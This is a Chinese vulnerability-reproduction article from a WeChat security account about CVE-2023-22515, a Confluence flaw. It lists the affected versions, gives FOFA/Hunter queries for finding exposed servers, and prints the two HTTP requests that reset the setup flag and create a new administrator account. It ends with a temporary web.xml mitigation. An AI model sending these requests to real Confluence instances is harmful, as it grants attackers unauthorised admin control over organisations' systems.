#  CVE-2023-22515：Confluence权限提升漏洞

原创 Locks_  [ Timeline Sec ](javascript:void\(0\);)

**Timeline Sec** ![]()

微信号 TimelineSec

功能介绍 学网络安全必备，专注于最新漏洞分析与复现，同时分享最新安全资讯。（Timeline Sec网络安全团队官方公众号）

____

___发表于_

收录于合集 #漏洞复现文章合集 140个

> 关注我们❤️，添加星标🌟，一起学安全！  
> 作者：Locks_@Timeline Sec  
> 本文字数：926  
> 阅读时长：2～3min  
> 声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
>

## 0x01 简介  

Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。使用简单，它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。

## 0x02 漏洞概述  

 **漏洞编号：CVE-2023-22515**

攻击者可以利用有访问权限的Confluence Data Center and
Server实例漏洞在未授权的情况下创建Confluence管理员用户并以管理员权限进入Confluence后台。

## 0x03 影响版本  

8.0.0 <= Confluence Data Center and Confluence Server <= 8.0.4

8.1.0 <= Confluence Data Center and Confluence Server <= 8.1.4

8.2.0 <= Confluence Data Center and Confluence Server <= 8.2.3

8.3.0 <= Confluence Data Center and Confluence Server <= 8.3.2

8.4.0 <= Confluence Data Center and Confluence Server <= 8.4.2

8.5.0 <= Confluence Data Center and Confluence Server <= 8.5.1

## 0x04 环境搭建  

fofa：`app="Atlassian-Confluence"`

hunter：`app.name="Confluence"`

## 0x05 漏洞复现  

漏洞URL:

    
    
    http://localhost/login.action?logout=true  
    

第一次发包：发送首次请求包为：

    
    
    GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1  
    

![]()

第二次发包：添加管理员账号

    
    
    POST /setup/setupadministrator.action HTTP/1.1  
    Host: localhost  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0  
    Accept-Encoding: gzip, deflate  
    Accept: */*  
    Connection: close  
    X-Atlassian-Token: no-check  
    Content-Length: 122  
    Content-Type: application/x-www-form-urlencoded  
      
    username=newadmin1&fullName=newadmin1&email=1234567123@qq.com&password=newPassword1&confirm=newPassword1&setup-next-button=Next  
    

![]()  
  
![]()

凭借新添加的账号进行登录

![]()

利用思路：

1、利用 ParametersInterceptor 的属性覆盖绕过  **/setup/** * 路由的限制，访问
`/setup/setupadministrator.action`  添加管理员

2、找到能触发 ParametersInterceptor 的 action，然后覆盖 setupComplete 绕过
SetupCheckInterceptor 对  **/setup/** * 路由的限制，然后访问
`/setup/setupadministrator.action`  添加管理员。

## 0x06 修复方式  

 **官方修复方案：**

建议您更新当前系统或软件至最新版，完成漏洞的修复。

 **临时缓解方案:**

1、修改 //confluence/WEB-INF/web.xml 文件，并添加以下内容（就在文件末尾的  标签之前）：

    
    
    <security-constraint>  
          <web-resource-collection>  
            <url-pattern>/setup/*</url-pattern>  
          <http-method-omission>*</http-method-omission>  
        </web-resource-collection>  
          <auth-constraint />  
      </security-constraint>  
    

2、重新启动 Confluence

## 参考链接  

https://mp.weixin.qq.com/s/99quAfbrwkXS40MqMUBY2w

 **推荐服务**

![]()

 **历史漏洞**

[
CVE-2019-3394](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483714&idx=1&sn=4a67ecbce88d9cc135ede2de6e0bc240&chksm=903927b2a74eaea4a67627c698bd67ce51984e58e8eacdf1d538b6ed2e69c34560167338fa69&scene=21#wechat_redirect)  
CVE-2019-3396  
CVE-2019-3398  
CVE-2021-26084  
CVE-2022-26134  
[CVE-2022-26138](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247490609&idx=1&sn=eb47834f70a7608f59739d1331c89598&chksm=90393ac1a74eb3d764e9378b2cead991968dc10f4c7accd38d022eb78f30e5977f20d3abd03e&scene=21#wechat_redirect)  

  

 **后台功能**  

回复【1】领取新人学习资料  
回复【2】进入漏洞查询功能  
回复【3】获取加群方式  
回复【4】领取安全电子书籍  

回复【5】进入SRC-QQ交流群

  

 **商务合作  
**

[ Timeline
Sec团队可合作项目清单](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247491949&idx=1&sn=5fd239d21a4a07859707b810c2a431ab&chksm=903ac79da74d4e8bf12c52fa3f3a0b14a9fbca35472362d4c40a4d9a6968a16e8d449896889c&scene=21#wechat_redirect)  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

